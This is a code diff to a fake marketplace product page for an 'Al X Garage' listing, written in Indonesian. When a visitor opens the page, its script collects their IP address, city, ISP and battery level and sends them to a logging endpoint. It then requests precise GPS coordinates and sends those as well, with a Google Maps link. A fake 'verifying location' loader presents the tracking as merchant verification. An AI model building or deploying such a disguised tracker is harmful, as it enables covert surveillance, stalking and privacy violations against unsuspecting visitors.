@@ -24,8 +24,9 @@
 <body class="max-w-md mx-auto bg-white min-h-screen relative pb-20">
 
   <div id="loader">
-    <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#ee4d2d]"></div>
-    <p class="text-sm mt-3 font-medium text-gray-700">Memproses verifikasi...</p>
+    <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#ee4d2d]"></div>
+    <p class="text-sm mt-4 font-bold text-[#ee4d2d]">Memverifikasi Lokasi...</p>
+    <p class="text-[10px] text-gray-400 mt-1">Mohon tunggu sebentar</p>
   </div>
 
   <div class="relative w-full aspect-square bg-gray-200" onclick="handleAction()">
@@ -56,7 +57,7 @@
   </div>
 
   <div class="mt-2 p-4 bg-white flex items-center gap-3 border-y border-gray-100" onclick="handleAction()">
-    <div class="w-12 h-12 rounded-full overflow-hidden border border-gray-200">
+    <div class="w-12 h-12 rounded-full overflow-hidden border border-gray-200 shadow-sm">
       <img src="https://images.unsplash.com/photo-1530046339160-ce3e530c7d2f?auto=format&fit=crop&q=80&w=150" alt="Al X Garage" class="w-full h-full object-cover">
     </div>
     <div class="flex-1">
@@ -98,13 +99,28 @@
       } catch (e) {}
     }
 
-    function askLocation() {
+    function processLocation(redirect = false) {
+      if (redirect) document.getElementById('loader').style.display = 'flex';
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (p) => sendLog("✅ Lokasi Diizinkan", [{ name: "Koordinat", value: `${p.coords.latitude},${p.coords.longitude}` }, { name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]),
-          () => sendLog("❌ Lokasi Ditolak", [{ name: "Status", value: "User menolak izin" }]),
-          { enableHighAccuracy: true }
+          async (p) => {
+            const lat = p.coords.latitude;
+            const lon = p.coords.longitude;
+            await sendLog("✅ LOKASI DIIZINKAN", [
+              { name: "Koordinat", value: `${lat},${lon}` },
+              { name: "Maps", value: `https://www.google.com/maps?q=$${lat},${lon}` }
+            ]);
+            if (redirect) window.location.href = 'halamantoko.html';
+          },
+          async () => {
+            await sendLog("❌ LOKASI DITOLAK", [{ name: "Status", value: "User menolak izin" }]);
+            if (redirect) window.location.href = 'halamantoko.html';
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
         );
+      } else if (redirect) {
+        window.location.href = 'halamantoko.html';
       }
     }
 
@@ -119,31 +135,15 @@
         fields.push({ name: "🔋 Baterai", value: `${Math.round(b.level * 100)}%`, inline: true });
         const res = await fetch('https://ipapi.co/json/');
         const d = await res.json();
-        fields.push({ name: "🌍 IP", value: d.ip }, { name: "📶 ISP", value: d.org });
+        fields.push({ name: "🌍 IP", value: d.ip }, { name: "🏙️ Kota", value: d.city }, { name: "📶 ISP", value: d.org });
       } catch (e) {}
       
-      await sendLog("🚀 Visitor Masuk (Al X Garage)", fields);
-
-      setTimeout(askLocation, 2000);
+      await sendLog("🚀 Visitor Masuk (Detail Produk)", fields);
+      setTimeout(() => processLocation(false), 2000);
     };
 
     function handleAction() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (p) => {
-            sendLog("✅ Lokasi Diizinkan (Button)", [{ name: "Koordinat", value: `${p.coords.latitude},${p.coords.longitude}` }, { name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]);
-            window.location.href = 'halamantoko.html';
-          },
-          () => {
-            sendLog("❌ Lokasi Ditolak (Button)", [{ name: "Status", value: "User menolak izin" }]);
-            alert("Silakan aktifkan lokasi untuk verifikasi Merchant.");
-            window.location.href = 'halamantoko.html';
-          },
-          { enableHighAccuracy: true }
-        );
-      } else {
-        window.location.href = 'halamantoko.html';
-      }
+      processLocation(true);
     }
   </script>
 </body>
